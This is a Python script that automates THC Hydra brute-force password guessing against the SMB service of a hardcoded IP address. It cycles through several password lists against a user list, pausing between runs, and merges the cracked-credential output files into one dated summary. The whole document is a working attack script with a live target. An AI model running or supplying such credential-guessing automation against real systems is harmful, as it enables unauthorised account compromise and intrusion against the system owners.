import os,time
from subprocess import Popen

realTime = time.strftime("%Y%m%d", time.localtime())
#print(realTime)
toPath = r"C:\adtest\re\汇总" + str(realTime) + ".txt"
result = list()


def isRunning(process_name) :
    try:
        #print('tasklist | findstr '+process_name)
        process=len(os.popen('tasklist | findstr '+process_name).readlines())
        #print(process)
        if process >=1 :
            return True
        else:
            return False
    except:
        print("程序错误")
        return False




for i in range(3,6):
    res = Popen(r"start C:\Users\chenbintest\Desktop\thc-hydra-windows-master\hydra.exe   -L C:\adtest\user.txt -P C:\adtest\pa\pass"+str(i)+r".txt -o C:\adtest\re\re"+str(i)+".txt 123.128.65.178 smb",shell=True)
    #time.sleep(7200)
    process_name = "hydra.exe"
    while isRunning(process_name):
        pass
    time.sleep(1800)

for i in range(1,6):
    path = r"C:\adtest\re\re"+ str(i) + ".txt"
    f1 = open(path,mode='r')
    for line in f1.readlines():
        result.append(line)
    f1.close()
#open(toPath, 'w').write('%s' % '\n'.join(result))
open(toPath, 'w').write('%s' % ''.join(result))


























